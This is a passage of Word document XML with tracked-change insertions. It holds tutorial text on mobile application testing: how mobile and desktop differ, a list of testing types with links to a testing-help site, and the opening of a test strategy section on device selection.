    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="333" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="334" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Mobile devices have less memory than desktop.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="335" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="336" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Mobiles use network connections like 2G, 3G, 4G or WIFI where desktop use broadband or dial-up connections.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="337" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The automation tool used for desktop application testing might not work on mobile applications.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="338" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="339" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="340" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of Mobile App Testing:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="341" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="342" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>To address all the above technical aspects, the following types of testing are performed on Mobile applications.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="343" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="344" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/usability-testing-guide/" \o "Usability testing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Usability testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– To make sure that the mobile app is easy to use and provides a satisfactory user experience to the customers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="345" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="346" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Compatibility testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing of the application in different mobiles devices, browsers, screen sizes and OS versions according to the requirements.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="347" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="348" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Interface testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing of menu options, buttons, bookmarks, history, settings, and navigation flow of the application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="349" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="350" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Services testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing the services of the application online and offline.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="351" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="352" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Low-level resource testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: Testing of memory usage, auto-deletion of temporary files, local database growing issues known as low-level resource testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="353" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="354" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/introduction-to-performance-testing-loadrunner-training-tutorial-part-1/" \o "Performance testing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Performance testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing the performance of the application by changing the connection from 2G, 3G to WIFI, sharing the documents, battery consumption, etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="355" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="356" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Operational testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing of backups and recovery plan if a battery goes down, or data loss while upgrading the application from a store.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="357" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="358" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/software-installationuninstallation-testing/" \o "Unstallation uninstallation testing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Installation tests</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>–</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Validation of the application by installing /uninstalling it on the devices.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="359" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/category/security-testing/" \o "Security testing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Security Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Testing an application to validate if the information system protects data or not.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="360" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="361" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="362" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Mobile Application Testing Strategy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="363" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="364" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The Test strategy should make sure that all the quality and performance guidelines are met. A few pointers in this area:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="365" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Selection of the devices </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>–</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Analyze the market and choose the devices that are widely used. (This decision mostly relies on the clients. The client or the app builders consider the popularity factor of certain devices as well as the marketing needs for the application to decide what handsets to use for testing.)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="366" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
